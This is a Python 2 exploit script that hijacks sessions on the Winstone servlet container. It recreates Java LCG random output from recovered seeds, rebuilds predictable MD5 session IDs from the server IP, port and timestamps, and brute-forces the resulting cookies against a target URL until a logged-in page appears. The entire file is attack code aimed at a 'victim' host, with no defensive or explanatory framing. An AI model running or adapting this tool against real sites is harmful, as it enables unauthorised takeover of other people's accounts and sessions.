import time,re,httplib,socket,hashlib
from datetime import datetime
from JavaLCGLib import JavaLCGMimic
from optparse import OptionParser

def isCookieValid(url,cookieToTry,success_str):
    response = None
    for i in range(10):
	headers = {"Cookie": cookieToTry}

    	host = url.replace("http://","").replace("https://","").split("/")[0]

    	conn = httplib.HTTPConnection(host,timeout=1)
    	conn.request("GET", url.replace("http://"+url,"").replace("https://"+url,""), headers=headers)
    	try:
    		response = conn.getresponse()
    	except socket.timeout:
		time.sleep(1)
	else:
		break

    if  response == None:
	print "Fail!"
	return False

    if response.status != 200:
	#print response.status
	return False

    html = response.read()

    #print html

    if re.search(success_str,str(html)):
        return True

    return False

def hijackSession(url,IPAddr,serverPort,sessionsFileName,success_str):
    f = open(sessionsFileName,"r")
    while True:
        line = f.readline().replace("\n","")
        if line == "":
            break

        (cookieName,timeMillisMin,timeMillisMax,PRNGseed,sessionCnt) = line.split(",")

        timeMillisMin = int(timeMillisMin)
        timeMillisMax = int(timeMillisMax)
        PRNGseed = int(PRNGseed)
        sessionCnt = int(sessionCnt)
        
        seek = 1
        for tryMillis in range(timeMillisMin,timeMillisMax):
            if seek > sessionCnt:
                break

            g = JavaLCGMimic(0)
            g.forceSeed(PRNGseed)
            for i in range(seek):
                PRNGout = g.nextLong()

            md5dig = hashlib.md5()
            md5dig.update("Winstone_"+IPAddr+"_"+serverPort+"_"+str(tryMillis)+str(PRNGout))

            cookieToTry = md5dig.hexdigest()

            if isCookieValid(url,cookieName+"="+cookieToTry,success_str):
                print "[!!!] Found valid cookie:",cookieName+"="+cookieToTry
                seek += 1


def main():
    parser = OptionParser(usage="usage: %prog [-f <FILENAME> | -s <STRING>] -u <URL> -i <IP>")
    parser.add_option("-u", "--url", action="store", type="string", dest="url",help="Application URL which is running on Winstone.")
    parser.add_option("-f", "--fname", action="store", type="string", dest="sessionsfilename",help="File where session information is stored. If parameter not specified 'winstonesessions.txt' file will be used.")
    parser.add_option("-i", "--victimip", action="store", type="string", dest="victimip",help="IP address of victim. Try to guess it)))")
    parser.add_option("-s", "--string", action="store", type="string", dest="success_string",help="String used to check cookies validness. Default value is 'LOGOUT'.")

    (options, args) = parser.parse_args()

    if (options.url == None) or (options.victimip == None):
        parser.print_usage()
        return

    filename = options.sessionsfilename
    if options.sessionsfilename == None:
        filename = 'winstonesessions.txt'

    success_string = options.success_string
    if options.success_string == None:
        success_string = 'LOGOUT'

    (host,port) = options.url.replace("http://","").replace("https://","").split("/")[0].split(":")

    hijackSession(options.url,options.victimip,port,filename,success_string)

main()
